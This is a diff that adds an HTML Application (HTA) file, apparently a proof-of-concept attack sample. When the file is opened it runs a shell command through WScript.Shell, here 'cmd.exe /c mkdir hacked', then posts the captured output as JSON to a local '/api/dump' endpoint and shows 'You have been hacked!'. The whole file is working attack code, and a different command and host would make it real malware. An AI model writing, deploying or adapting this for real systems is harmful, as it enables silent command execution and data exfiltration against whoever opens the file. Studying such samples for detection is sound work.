@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Simple HTA Application</title>
+    <HTA:APPLICATION
+      APPLICATIONNAME="TestApp"
+      BORDER="thin"
+      SCROLL="no"
+      SINGLEINSTANCE="yes"
+    />
+    <script>
+      function runCommand() {
+        try {
+          // Create WScript.Shell ActiveX Object
+          var shell = new ActiveXObject("WScript.Shell");
+
+          // Command to execute (e.g., dir for listing files)
+          var command = "cmd.exe /c mkdir hacked";
+
+          // Execute command and capture output
+          var exec = shell.Exec(command);
+          var output = "";
+
+          // Read command output
+          while (!exec.StdOut.AtEndOfStream) {
+            output += exec.StdOut.ReadLine() + "\n";
+          }
+          sendOutputToAPI(output);
+        } catch (e) {
+          alert(e.message);
+        }
+      }
+
+      function sendOutputToAPI(data) {
+        try {
+          // API endpoint
+          var apiEndpoint = "http://localhost:3000/api/dump";
+
+          // Create XMLHttpRequest
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", apiEndpoint, true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.setRequestHeader("Accept", "application/json");
+
+          // Escape control characters, newlines, and other problematic characters
+          var escapedData = data
+            .replace(/\\/g, "\\\\") // Escape backslashes
+            .replace(/"/g, '\\"') // Escape double quotes
+            .replace(/\r\n/g, "\\n") // Escape newline (CRLF)
+            .replace(/\n/g, "\\n") // Escape newline (LF)
+            .replace(/\r/g, "\\r"); // Escape carriage return
+
+          // Manually build the JSON payload as a string
+          var payload = '{ "output": "' + escapedData + '" }';
+          // Send the request
+          xhr.send(payload);
+
+          // Log the response
+          xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              alert("Output sent successfully!");
+            } else {
+              alert("Failed to send output: " + xhr.statusText);
+            }
+          };
+        } catch (e) {
+          alert("Error sending data to API: " + e.message);
+        }
+      }
+
+      runCommand();
+    </script>
+  </head>
+  <body>
+    <h1>You have been hacked!</h1>
+  </body>
+</html>
